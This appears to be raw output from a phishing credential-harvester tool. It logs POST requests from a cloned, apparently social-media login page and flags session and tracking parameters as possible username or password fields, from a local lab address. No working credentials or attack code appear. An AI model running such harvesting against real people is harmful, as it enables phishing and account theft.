PARAM: local_storage[Session]=20                                                                 
PARAM: local_storage[signal_flush_timestamp]=13                                                  
PARAM: local_storage[mutex_falco_queue_immediately\u005E$\u005E$]=20                             
PARAM: local_storage[mutex_falco_queue_log\u005E$\u005E$]=20                                     
PARAM: session_storage[TabId]=6                                                                  
PARAM: session_storage[sp_pi]=216                                                                
PARAM: logtime=11                                                                                
PARAM: __aaid=0                                                                                  
POSSIBLE USERNAME FIELD FOUND: __user=0                                                          
PARAM: __a=1                                                                                     
PARAM: __req=c                                                                                   
PARAM: __hs=19884.BP:DEFAULT.2.0..0.0                                                            
PARAM: dpr=2                                                                                     
PARAM: __ccg=EXCELLENT                                                                           
PARAM: __rev=1014092037                                                                          
PARAM: __s=:lq1on7:pileej                                                                        
PARAM: __hsi=7378946191122667060                                                                 
PARAM: __dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zE6u7E3rw5ux60Vo1upE4W0OE2WxO0FE2awt81s8hwnU1oU884y0lW0ny0RE2Jw8Xwn83fw5rwSyE1582ZwrU1Xo1UU3jw                                                            
PARAM: __csr=                                                                                    
PARAM: lsd=AVo0ipaaaiw                                                                           
PARAM: jazoest=21042                                                                             
POSSIBLE PASSWORD FIELD FOUND: __spin_r=1014092037                                               
POSSIBLE PASSWORD FIELD FOUND: __spin_b=trunk                                                    
POSSIBLE PASSWORD FIELD FOUND: __spin_t=1718044791                                               
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                                    
                                                                                                 
                                                                                                 
192.168.1.10 - - [10/Jun/2024 15:46:22] "POST /ajax/webstorage/process_keys/?state=1 HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
PARAM: local_storage[hb_timestamp]=13                                                            
PARAM: local_storage[mutex_falco_queue_critical\u005E$\u005E$]=20                                
PARAM: local_storage[Session]=20                                                                 
PARAM: local_storage[signal_flush_timestamp]=13                                                  
PARAM: local_storage[mutex_falco_queue_immediately\u005E$\u005E$]=20                             
PARAM: local_storage[mutex_falco_queue_log\u005E$\u005E$]=20                                     
PARAM: session_storage[TabId]=6                                                                  
PARAM: session_storage[sp_pi]=216                                                                
PARAM: logtime=11                                                                                
PARAM: __aaid=0                                                                                  
POSSIBLE USERNAME FIELD FOUND: __user=0                                                          
PARAM: __a=1                                                                                     
PARAM: __req=d                                                                                   
PARAM: __hs=19884.BP:DEFAULT.2.0..0.0                                                            
PARAM: dpr=2                                                                                     
PARAM: __ccg=EXCELLENT                                                                           
PARAM: __rev=1014092037                                                                          
PARAM: __s=:lq1on7:pileej                                                                        
PARAM: __hsi=7378946191122667060                                                                 
PARAM: __dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zE6u7E3rw5ux60Vo1upE4W0OE2WxO0FE2awt81s8hwnU1oU884y0lW0ny0RE2Jw8Xwn83fw5rwSyE1582ZwrU1Xo1UU3jw                                                            
PARAM: __csr=                                                                                    
PARAM: lsd=AVo0ipaaaiw                                                                           
PARAM: jazoest=21042                                                                             
POSSIBLE PASSWORD FIELD FOUND: __spin_r=1014092037                                               
POSSIBLE PASSWORD FIELD FOUND: __spin_b=trunk                                                    
POSSIBLE PASSWORD FIELD FOUND: __spin_t=1718044791                                               
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                                    
                                                                                                 
                                                                                                 
192.168.1.10 - - [10/Jun/2024 15:46:22] "POST /ajax/webstorage/process_keys/?state=1 HTTP/1.1" 302 -

